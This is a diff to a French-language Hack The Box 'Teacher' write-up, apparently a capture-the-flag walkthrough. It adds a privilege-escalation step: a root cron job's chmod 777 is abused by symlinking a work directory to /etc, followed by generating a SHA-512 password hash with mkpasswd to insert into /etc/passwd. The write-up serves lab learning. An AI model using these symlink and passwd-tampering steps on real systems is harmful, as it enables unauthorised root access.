@@ -230,7 +230,15 @@ Dans ce cas il y'a rien de bien compliqué nous allons simplement supprimerl les
 
 [![forthebadge made-with-python](https://i.giphy.com/media/l4HodBpDmoMA5p9bG/giphy.webp)](https://i.giphy.com/media/l4HodBpDmoMA5p9bG/giphy.webp)
 
-Je créer un mot de passe avec mkpasswd pour mettre cela dans le fichier passwd.
+Le travail cron change les autorisations en 777 lorsqu'il extrait l'archive de sauvegarde. Si nous échangeons le répertoire de cours dans le dossier ~ /work/tmp avec un lien symbolique vers /etc, les autorisations de /etc seront modifiées et toutes les modifications seront 777.
+
+    giovanni@teacher:~/work/tmp$ rm -rf courses
+    giovanni@teacher:~/work/tmp$ ln -s /etc courses
+    giovanni@teacher:~/work/tmp$ ls -l / | grep etc
+    ls -l / | grep etc
+    drwxrwxrwx 85 root root  4096 Apr 18 21:55 etc
+    
+Comme vous pouvez le voir nous avons les permissions d'écrire et de lire n'importe quelle fichier dans le dossier /etc. Je vais créer un mot de passe avec mkpasswd pour mettre cela dans le fichier passwd
 
     root@Seyptoo:~/htb/writeup/Teacher# mkpasswd -m sha-512 seyptoo
     $6$4.FCX0BzdmJd77$HWgUSNGZsazwyv1ZMUVIP1u6R8wsPwTk20xOp0kRHd2T2EELmaIlxO9aloi0QtxBnfFjMlLehMDccVjd5yN00
